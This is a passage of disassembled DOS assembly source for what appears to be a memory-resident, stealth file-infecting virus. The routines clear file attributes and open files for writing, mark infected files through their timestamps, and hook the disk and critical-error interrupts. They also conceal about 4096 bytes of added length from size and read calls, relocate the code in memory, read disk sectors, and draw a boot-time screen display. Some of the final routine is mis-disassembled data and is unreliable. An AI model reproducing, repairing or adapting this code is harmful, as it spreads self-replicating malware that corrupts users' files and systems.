;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_7       proc    near
        call    sub_21          ; (100F)
        mov di,dx
        add di,0Dh
        push    ds
        pop es
        jmp short loc_62        ; (0B65)
  
;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_8:
        call    sub_21          ; (100F)
        push    ds
        pop es
        mov di,dx
        mov cx,50h
        xor ax,ax           ; Zero register
        mov bl,0
        cmp byte ptr [di+1],3Ah ; ':'
        jne loc_61          ; Jump if not equal
        mov bl,[di]
        and bl,1Fh
loc_61:
        mov cs:data_60e,bl      ; (3BCC:1228=0)
        repne   scasb           ; Rep zf=0+cx >0 Scan es:[di] for al
loc_62:
        mov ax,[di-3]
        and ax,0DFDFh
        add ah,al
        mov al,[di-4]
        and al,0DFh
        add al,ah
        mov byte ptr cs:data_30e,0  ; (3BCC:0020=0)
        cmp al,0DFh
        je  loc_63          ; Jump if equal
        inc byte ptr cs:data_30e    ; (3BCC:0020=0)
        cmp al,0E2h
        jne loc_64          ; Jump if not equal
loc_63:
        call    sub_20          ; (1006)
        clc             ; Clear carry flag
        retn
loc_64:
        call    sub_20          ; (1006)
        stc             ; Set carry flag
        retn
sub_7       endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_9       proc    near
        push    bx
        mov ah,51h          ; 'Q'
        call    sub_24          ; (10B4)
        mov cs:data_85e,bx      ; (3BCC:12A3=0)
        pop bx
        retn
sub_9       endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_10      proc    near
        call    sub_13          ; (0EE6)
        push    dx
        mov dl,cs:data_60e      ; (3BCC:1228=0)
        mov ah,36h          ; '6'
        call    sub_24          ; (10B4)
        mul cx          ; dx:ax = reg * ax
        mul bx          ; dx:ax = reg * ax
        mov bx,dx
        pop dx
        or  bx,bx           ; Zero ?
        jnz loc_65          ; Jump if not zero
        cmp ax,4000h
        jb  loc_66          ; Jump if below
loc_65:
        mov ax,4300h
        call    sub_24          ; (10B4)
        jc  loc_66          ; Jump if carry Set
        mov di,cx
        xor cx,cx           ; Zero register
        mov ax,4301h
        call    sub_24          ; (10B4)
        cmp byte ptr cs:data_95e,0  ; (3BCC:12DA=0)
        jne loc_66          ; Jump if not equal
        mov ax,3D02h
        call    sub_24          ; (10B4)
        jc  loc_66          ; Jump if carry Set
        mov bx,ax
        mov cx,di
        mov ax,4301h
        call    sub_24          ; (10B4)
        push    bx
        mov dl,cs:data_60e      ; (3BCC:1228=0)
        mov ah,32h          ; '2'
        call    sub_24          ; (10B4)
        mov ax,[bx+1Eh]
        mov cs:data_106e,ax     ; (3BCC:12EC=0)
        pop bx
        call    sub_14          ; (0F8C)
        retn
loc_66:
        xor bx,bx           ; Zero register
        dec bx
        call    sub_14          ; (0F8C)
        retn
sub_10      endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_11      proc    near
        push    cx
        push    dx
        push    ax
        mov ax,4400h
        call    sub_24          ; (10B4)
        xor dl,80h
        test    dl,80h
        jz  loc_67          ; Jump if zero
        mov ax,5700h
        call    sub_24          ; (10B4)
        test    dh,80h
loc_67:
        pop ax
        pop dx
        pop cx
        retn
sub_11      endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_12      proc    near
        call    sub_21          ; (100F)
        mov ax,4201h
        xor cx,cx           ; Zero register
        xor dx,dx           ; Zero register
        call    sub_24          ; (10B4)
        mov cs:data_86e,ax      ; (3BCC:12A5=0)
        mov cs:data_87e,dx      ; (3BCC:12A7=0)
        mov ax,4202h
        xor cx,cx           ; Zero register
        xor dx,dx           ; Zero register
        call    sub_24          ; (10B4)
        mov cs:data_88e,ax      ; (3BCC:12A9=0)
        mov cs:data_89e,dx      ; (3BCC:12AB=0)
        mov ax,4200h
        mov dx,cs:data_86e      ; (3BCC:12A5=0)
        mov cx,cs:data_87e      ; (3BCC:12A7=0)
        call    sub_24          ; (10B4)
        call    sub_20          ; (1006)
        retn
sub_12      endp
  
        or  al,al           ; Zero ?
        jnz loc_70          ; Jump if not zero
        and word ptr cs:data_93e,0FFFEh ; (3BCC:12B3=0)
        call    sub_19          ; (0FF3)
        call    sub_24          ; (10B4)
        jc  loc_69          ; Jump if carry Set
        test    dh,80h
        jz  loc_68          ; Jump if zero
        sub dh,0C8h
loc_68:
        jmp loc_24          ; (055F)
loc_69:
        or  word ptr cs:data_93e,1  ; (3BCC:12B3=0)
        jmp loc_24          ; (055F)
loc_70:
        cmp al,1
        jne loc_73          ; Jump if not equal
        and word ptr cs:data_93e,0FFFEh ; (3BCC:12B3=0)
        test    dh,80h
        jz  loc_71          ; Jump if zero
        sub dh,0C8h
loc_71:
        call    sub_11          ; (0C06)
        jz  loc_72          ; Jump if zero
        add dh,0C8h
loc_72:
        call    sub_24          ; (10B4)
        mov [bp-4],ax
        adc word ptr cs:data_93e,0  ; (3BCC:12B3=0)
        jmp loc_25          ; (05B6)
        cmp al,2
        jne loc_73          ; Jump if not equal
        call    sub_11          ; (0C06)
        jz  loc_73          ; Jump if zero
        sub word ptr [bp-0Ah],1000h
        sbb word ptr [bp-8],0
loc_73:
        jmp loc_23          ; (052F)
        and byte ptr cs:data_93e,0FEh   ; (3BCC:12B3=0)
        call    sub_11          ; (0C06)
        jz  loc_73          ; Jump if zero
        mov cs:data_91e,cx      ; (3BCC:12AF=0)
        mov cs:data_90e,dx      ; (3BCC:12AD=0)
        mov word ptr cs:data_92e,0  ; (3BCC:12B1=0)
        call    sub_12          ; (0C24)
        mov ax,cs:data_88e      ; (3BCC:12A9=0)
        mov dx,cs:data_89e      ; (3BCC:12AB=0)
        sub ax,1000h
        sbb dx,0
        sub ax,cs:data_86e      ; (3BCC:12A5=0)
        sbb dx,cs:data_87e      ; (3BCC:12A7=0)
        jns loc_74          ; Jump if not sign
        mov word ptr [bp-4],0
        jmp loc_37          ; (0769)
loc_74:
        jnz loc_75          ; Jump if not zero
        cmp ax,cx
        ja  loc_75          ; Jump if above
        mov cs:data_91e,ax      ; (3BCC:12AF=0)
loc_75:
        mov dx,cs:data_86e      ; (3BCC:12A5=0)
        mov cx,cs:data_87e      ; (3BCC:12A7=0)
        or  cx,cx           ; Zero ?
        jnz loc_76          ; Jump if not zero
        cmp dx,1Ch
        jbe loc_77          ; Jump if below or =
loc_76:
        mov dx,cs:data_90e      ; (3BCC:12AD=0)
        mov cx,cs:data_91e      ; (3BCC:12AF=0)
        mov ah,3Fh          ; '?'
        call    sub_24          ; (10B4)
        add ax,cs:data_92e      ; (3BCC:12B1=0)
        mov [bp-4],ax
        jmp loc_25          ; (05B6)
loc_77:
        mov si,dx
        mov di,dx
        add di,cs:data_91e      ; (3BCC:12AF=0)
        cmp di,1Ch
        jb  loc_78          ; Jump if below
        xor di,di           ; Zero register
        jmp short loc_79        ; (0D55)
loc_78:
        sub di,1Ch
        neg di
loc_79:
        mov ax,dx
        mov cx,cs:data_89e      ; (3BCC:12AB=0)
        mov dx,cs:data_88e      ; (3BCC:12A9=0)
        add dx,0Fh
        adc cx,0
        and dx,0FFF0h
        sub dx,0FFCh
        sbb cx,0
        add dx,ax
        adc cx,0
        mov ax,4200h
        call    sub_24          ; (10B4)
        mov cx,1Ch
        sub cx,di
        sub cx,si
        mov ah,3Fh          ; '?'
        mov dx,cs:data_90e      ; (3BCC:12AD=0)
        call    sub_24          ; (10B4)
        add cs:data_90e,ax      ; (3BCC:12AD=0)
        sub cs:data_91e,ax      ; (3BCC:12AF=0)
        add cs:data_92e,ax      ; (3BCC:12B1=0)
        xor cx,cx           ; Zero register
        mov dx,1Ch
        mov ax,4200h
        call    sub_24          ; (10B4)
        jmp loc_76          ; (0D24)
        and byte ptr cs:data_93e,0FEh   ; (3BCC:12B3=0)
        call    sub_11          ; (0C06)
        jnz loc_80          ; Jump if not zero
        jmp loc_73          ; (0CC2)
loc_80:
        mov cs:data_91e,cx      ; (3BCC:12AF=0)
        mov cs:data_90e,dx      ; (3BCC:12AD=0)
        mov word ptr cs:data_92e,0  ; (3BCC:12B1=0)
        call    sub_12          ; (0C24)
        mov ax,cs:data_88e      ; (3BCC:12A9=0)
        mov dx,cs:data_89e      ; (3BCC:12AB=0)
        sub ax,1000h
        sbb dx,0
        sub ax,cs:data_86e      ; (3BCC:12A5=0)
        sbb dx,cs:data_87e      ; (3BCC:12A7=0)
        js  loc_81          ; Jump if sign=1
        jmp short loc_83        ; (0E67)
loc_81:
        call    sub_13          ; (0EE6)
        push    cs
        pop ds
        mov dx,ds:data_88e      ; (3BCC:12A9=0)
        mov cx,ds:data_89e      ; (3BCC:12AB=0)
        add dx,0Fh
        adc cx,0
        and dx,0FFF0h
        sub dx,0FFCh
        sbb cx,0
        mov ax,4200h
        call    sub_24          ; (10B4)
        mov dx,4
        mov cx,1Ch
        mov ah,3Fh          ; '?'
        call    sub_24          ; (10B4)
        mov ax,4200h
        xor cx,cx           ; Zero register
        mov dx,cx
        call    sub_24          ; (10B4)
        mov dx,4
        mov cx,1Ch
        mov ah,40h          ; '@'
        call    sub_24          ; (10B4)
        mov dx,0F000h
        mov cx,0FFFFh
        mov ax,4202h
        call    sub_24          ; (10B4)
        mov ah,40h          ; '@'
        xor cx,cx           ; Zero register
        call    sub_24          ; (10B4)
        mov dx,ds:data_86e      ; (3BCC:12A5=0)
        mov cx,ds:data_87e      ; (3BCC:12A7=0)
        mov ax,4200h
        call    sub_24          ; (10B4)
        mov ax,5700h
        call    sub_24          ; (10B4)
        test    dh,80h
        jz  loc_82          ; Jump if zero
        sub dh,0C8h
        mov ax,5701h
        call    sub_24          ; (10B4)
loc_82:
        call    sub_14          ; (0F8C)
        jmp loc_23          ; (052F)
loc_83:
        jnz loc_84          ; Jump if not zero
        cmp ax,cx
        ja  loc_84          ; Jump if above
        jmp loc_81          ; (0DE9)
loc_84:
        mov dx,cs:data_86e      ; (3BCC:12A5=0)
        mov cx,cs:data_87e      ; (3BCC:12A7=0)
        or  cx,cx           ; Zero ?
        jnz loc_85          ; Jump if not zero
        cmp dx,1Ch
        ja  loc_85          ; Jump if above
        jmp loc_81          ; (0DE9)
loc_85:
        call    sub_19          ; (0FF3)
        call    sub_24          ; (10B4)
        call    sub_17          ; (0FC7)
        mov ax,5700h
        call    sub_24          ; (10B4)
        test    dh,80h
        jnz loc_86          ; Jump if not zero
        add dh,0C8h
        mov ax,5701h
        call    sub_24          ; (10B4)
loc_86:
        jmp loc_25          ; (05B6)
        jmp loc_23          ; (052F)
        pop word ptr cs:data_73e    ; (3BCC:1241=0)
        pop word ptr cs:data_73e+2  ; (3BCC:1243=0)
        pop word ptr cs:data_96e    ; (3BCC:12DB=0)
        and word ptr cs:data_96e,0FFFEh ; (3BCC:12DB=0)
        cmp byte ptr cs:data_95e,0  ; (3BCC:12DA=0)
        jne loc_87          ; Jump if not equal
        push    word ptr cs:data_96e    ; (3BCC:12DB=0)
        call    dword ptr cs:data_63e   ; (3BCC:122D=0)
        jnc loc_88          ; Jump if carry=0
        inc byte ptr cs:data_95e    ; (3BCC:12DA=0)
loc_87:
        stc             ; Set carry flag
loc_88:
        jmp dword ptr cs:data_73e   ; (3BCC:1241=0)
        xor al,al           ; Zero register
        mov byte ptr cs:data_95e,1  ; (3BCC:12DA=0)
        iret                ; Interrupt return
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_13      proc    near
        mov byte ptr cs:data_95e,0  ; (3BCC:12DA=0)
        call    sub_21          ; (100F)
        push    cs
        pop ds
        mov al,13h
        call    sub_1           ; (02B5)
        mov ds:data_63e,bx      ; (3BCC:122D=0)
        mov word ptr ds:data_63e+2,es   ; (3BCC:122F=70h)
        mov ds:data_69e,bx      ; (3BCC:1239=0)
        mov word ptr ds:data_69e+2,es   ; (3BCC:123B=70h)
        mov dl,0
        mov al,0Dh
        call    sub_1           ; (02B5)
        mov ax,es
        cmp ax,0C000h
        jae loc_89          ; Jump if above or =
        mov dl,2
loc_89:
        mov al,0Eh
        call    sub_1           ; (02B5)
        mov ax,es
        cmp ax,0C000h
        jae loc_90          ; Jump if above or =
        mov dl,2
loc_90:
        mov ds:data_81e,dl      ; (3BCC:1250=0)
        call    sub_22          ; (103C)
        mov ds:data_97e,ss      ; (3BCC:12DD=0EF4h)
        mov ds:data_98e,sp      ; (3BCC:12DF=0)
        push    cs
        mov ax,0D40h
        push    ax
        mov ax,70h
        mov es,ax
        mov cx,0FFFFh
        mov al,0CBh
        xor di,di           ; Zero register
        repne   scasb           ; Rep zf=0+cx >0 Scan es:[di] for al
        dec di
        pushf               ; Push flags
        push    es
        push    di
        pushf               ; Push flags
        pop ax
        or  ah,1
        push    ax
        in  al,21h          ; port 21h, 8259-1 int IMR
        mov ds:data_102e,al     ; (3BCC:12E5=0)
        mov al,0FFh
        out 21h,al          ; port 21h, 8259-1 int comands
        popf                ; Pop flags
        xor ax,ax           ; Zero register
        jmp dword ptr ds:data_63e   ; (3BCC:122D=0)
loc_91:
        lds dx,dword ptr ds:data_65e    ; (3BCC:1231=0) Load 32 bit ptr
        mov al,1
        call    sub_27          ; (11BC)
        push    cs
        pop ds
        mov dx,0C89h
        mov al,13h
        call    sub_27          ; (11BC)
        mov al,24h          ; '$'
        call    sub_1           ; (02B5)
        mov ds:data_71e,bx      ; (3BCC:123D=0)
        mov word ptr ds:data_71e+2,es   ; (3BCC:123F=70h)
        mov dx,0CBDh
        mov al,24h          ; '$'
        call    sub_27          ; (11BC)
        call    sub_20          ; (1006)
        retn
sub_13      endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_14      proc    near
loc_92:
        call    sub_21          ; (100F)
        lds dx,dword ptr cs:data_69e    ; (3BCC:1239=0) Load 32 bit ptr
        mov al,13h
        call    sub_27          ; (11BC)
        lds dx,dword ptr cs:data_71e    ; (3BCC:123D=0) Load 32 bit ptr
        mov al,24h          ; '$'
        call    sub_27          ; (11BC)
        call    sub_20          ; (1006)
        retn
sub_14      endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_15      proc    near
        mov ax,3300h
        call    sub_24          ; (10B4)
        mov cs:data_99e,dl      ; (3BCC:12E1=0)
        mov ax,3301h
        xor dl,dl           ; Zero register
        call    sub_24          ; (10B4)
        retn
sub_15      endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_16      proc    near
        mov dl,cs:data_99e      ; (3BCC:12E1=0)
        mov ax,3301h
        call    sub_24          ; (10B4)
        retn
sub_16      endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_17      proc    near
        pop word ptr cs:data_105e   ; (3BCC:12EA=0)
        pushf               ; Push flags
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es
        jmp word ptr cs:data_105e   ; (3BCC:12EA=0)
  
;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_18:
        les di,dword ptr cs:data_67e    ; (3BCC:1235=0) Load 32 bit ptr
        mov si,data_78e     ; (3BCC:124B=0)
        push    cs
        pop ds
        cld             ; Clear direction
        mov cx,5
  
locloop_93:
        lodsb               ; String [si] to al
        xchg    al,es:[di]
        mov [si-1],al
        inc di
        loop    locloop_93      ; Loop if cx > 0
  
        retn
sub_17      endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_19      proc    near
        pop word ptr cs:data_105e   ; (3BCC:12EA=0)
        pop es
        pop ds
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        popf                ; Pop flags
        jmp word ptr cs:data_105e   ; (3BCC:12EA=0)
  
;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_20:
        mov word ptr cs:data_119e,0DD3h ; (3BCC:135D=0)
        jmp short loc_94        ; (1016)
  
;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_21:
        mov word ptr cs:data_119e,0DA7h ; (3BCC:135D=0)
loc_94:
        mov cs:data_117e,ss     ; (3BCC:1359=0EF4h)
        mov cs:data_116e,sp     ; (3BCC:1357=0)
        push    cs
        pop ss
        mov sp,cs:data_118e     ; (3BCC:135B=0)
        call    word ptr cs:data_119e   ; (3BCC:135D=0)
        mov cs:data_118e,sp     ; (3BCC:135B=0)
        mov ss,cs:data_117e     ; (3BCC:1359=0EF4h)
        mov sp,cs:data_116e     ; (3BCC:1357=0)
        retn
sub_19      endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_22      proc    near
        mov al,1
        call    sub_1           ; (02B5)
        mov cs:data_65e,bx      ; (3BCC:1231=0)
        mov word ptr cs:data_65e+2,es   ; (3BCC:1233=70h)
        push    cs
        pop ds
        mov dx,23h
        call    sub_27          ; (11BC)
        retn
sub_22      endp
  
        call    sub_23          ; (105A)
        jmp loc_23          ; (052F)
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_23      proc    near
        cmp byte ptr cs:data_100e,0 ; (3BCC:12E2=0)
        je  loc_ret_96      ; Jump if equal
        cmp bx,0FFFFh
        jne loc_ret_96      ; Jump if not equal
        mov bx,160h
        call    sub_24          ; (10B4)
        jc  loc_ret_96      ; Jump if carry Set
        mov dx,cs
        cmp ax,dx
        jb  loc_95          ; Jump if below
        mov es,ax
        mov ah,49h          ; 'I'
        call    sub_24          ; (10B4)
        jmp short loc_ret_96    ; (10AA)
loc_95:
        dec dx
        mov ds,dx
        mov word ptr ds:data_19e,0  ; (3BCB:0001=0FFFFh)
        inc dx
        mov ds,dx
        mov es,ax
        push    ax
        mov cs:data_80e,ax      ; (3BCC:124E=3BCCh)
        xor si,si           ; Zero register
        mov di,si
        mov cx,0B00h
        rep movsw           ; Rep when cx >0 Mov [si] to es:[di]
        dec ax
        mov es,ax
        mov ax,cs:data_77e      ; (3BCC:1249=0)
        mov es:data_127e,ax     ; (48FF:0001=0)
        mov ax,0E8Ah
        push    ax
        retf                ; Return far
  
loc_ret_96:
        retn
sub_23      endp
  
        db   2Eh,0C6h, 06h,0F0h
  
locloop_97:
        adc al,[bp+si]
        jmp loc_23          ; (052F)
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_24      proc    near
        pushf               ; Push flags
        call    dword ptr cs:data_67e   ; (3BCC:1235=0)
        retn
sub_24      endp
  
        cli             ; Disable interrupts
        xor ax,ax           ; Zero register
        mov ss,ax
        mov sp,7C00h
        jmp short loc_98        ; (1114)
        esc 3,bl            ; coprocessor escape
        esc 3,[bx+si]       ; coprocessor escape
        stc             ; Set carry flag
        loopnz  locloop_97      ; Loop if zf=0, cx>0
  
        retn
        add byte ptr ds:[1211h][bx+di],24h  ; (3BCC:1211=12h) '$'
        inc ax
        adc word ptr [bx+di],2412h
        inc ax
        db  0F1h,0F1h, 12h, 24h, 40h, 81h
        db   21h, 12h, 24h, 40h, 81h, 10h
        db  0E3h,0C3h, 80h, 00h, 00h
        db  8 dup (0)
        db   82h, 44h,0F8h, 70h,0C0h, 82h
        db   44h, 80h, 88h,0C0h, 82h, 44h
        db   80h, 80h,0C0h, 82h, 44h,0F0h
        db   70h,0C0h, 82h, 28h, 80h, 08h
        db  0C0h, 82h, 28h, 80h, 88h, 00h
        db  0F2h, 10h,0F8h, 70h,0C0h
loc_98:
        push    cs
        pop ds
        mov dx,0B000h
        mov ah,0Fh
        int 10h         ; Video display   ah=functn 0Fh
                        ;  get state, al=mode, bh=page
        cmp al,7
        je  loc_99          ; Jump if equal
        mov dx,0B800h
loc_99:
        mov es,dx
        cld             ; Clear direction
        xor di,di           ; Zero register
        mov cx,7D0h
        mov ax,720h
        rep stosw           ; Rep when cx >0 Store ax to es:[di]
        mov si,data_122e        ; (3BCC:7C0E=0)
        mov bx,2AEh
loc_100:
        mov bp,5
        mov di,bx
loc_101:
        lodsb               ; String [si] to al
        mov dh,al
        mov cx,8
  
locloop_102:
        mov ax,720h
        shl dx,1            ; Shift w/zeros fill
        jnc loc_103         ; Jump if carry=0
        mov al,0DBh
loc_103:
        stosw               ; Store ax to es:[di]
        loop    locloop_102     ; Loop if cx > 0
  
        dec bp
        jnz loc_101         ; Jump if not zero
        add bx,0A0h
        cmp si,7C59h
        jb  loc_100         ; Jump if below
        mov ah,1
        int 10h         ; Video display   ah=functn 01h
                        ;  set cursor mode in cx
        mov al,8
        mov dx,7CB9h
        call    sub_27          ; (11BC)
        mov ax,7FEh
        out 21h,al          ; port 21h, 8259-1 int comands
                        ;  al = 0FEh, IRQ0 (timer) only
        sti             ; Enable interrupts
        xor bx,bx           ; Zero register
        mov cx,1
loc_104:
        jmp short loc_104       ; (1172)
        dec cx
        jnz loc_105         ; Jump if not zero
        xor di,di           ; Zero register
        inc bx
        call    sub_25          ; (1187)
        call    sub_25          ; (1187)
        mov cl,4
loc_105:
        mov al,20h          ; ' '
        out 20h,al          ; port 20h, 8259-1 int command
                        ;  al = 20h, end of interrupt
        iret                ; Interrupt return
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_25      proc    near
        mov cx,28h
  
locloop_106:
        call    sub_26          ; (11B3)
        stosw               ; Store ax to es:[di]
        stosw               ; Store ax to es:[di]
        loop    locloop_106     ; Loop if cx > 0
  
        add di,9Eh
        mov cx,17h
  
locloop_107:
        call    sub_26          ; (11B3)
        stosw               ; Store ax to es:[di]
        add di,9Eh
        loop    locloop_107     ; Loop if cx > 0
  
        std             ; Set direction flag
        xor byte ptr ds:data_125e,1 ; (3BCC:7CE7=0)
        xor byte ptr ds:data_123e,28h   ; (3BCC:7CD7=0) '('
        xor byte ptr ds:data_124e,28h   ; (3BCC:7CE2=0) '('
        retn
sub_25      endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_26      proc    near
        and bx,3
        mov al,ds:data_121e[bx] ; (3BCC:7C0A=0)
        inc bx
        retn
sub_26      endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_27      proc    near
        push    es
        push    bx
        xor bx,bx           ; Zero register
        mov es,bx
        mov bl,al
        shl bx,1            ; Shift w/zeros fill
        shl bx,1            ; Shift w/zeros fill
        mov es:[bx],dx
        mov es:[bx+2],ds
        pop bx
        pop es
        retn
sub_27      endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_28      proc    near
        call    sub_13          ; (0EE6)
        mov dl,80h
        call    sub_29          ; (11E2)
        xor dl,dl           ; Zero register
        call    sub_29          ; (11E2)
        jmp loc_92          ; (0F8C)
sub_28      endp
  
  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  
sub_29      proc    near
        mov ax,201h
;*      call    sub_30          ;*(11F9)
        db  0E8h, 11h, 00h
;*      jnz loc_108         ;*Jump if not zero
        db   75h, 15h
        add [bp+di],dh
        sbb si,[bx+si+0]
        add [bx+si],al
;*      pop cs          ; Dangerous 8088 only
        db  0Fh
        push    ax
        adc bh,[bx+14h]
        clc             ; Clear carry flag
;*      pop cs          ; Dangerous 8088 only
        db  0Fh
        in  ax,0Fh          ; port 0Fh, DMA-1 all mask bit
        add [bx+di],dl
;*      call    far ptr sub_31      ;*(700C:670E)
        db   9Ah, 0Eh, 67h, 0Ch, 70h
        add [bp+di],dh
        push    cs
        add bx,word ptr cs:[1114h][bx+di]   ; (3BCC:1114=1F0Eh)
        adc di,bp
        mov es,[bx+si]
        add [bx+di],dl
        adc [bx+si+12h],dx
        xchg    ax,dx
        adc cx,[bp+118Dh]
        adc [bx+22h],di
        nop             ;*ASM fixup - displacement
sub_29      endp
  
  
seg_a       ends
  
  
  
        end start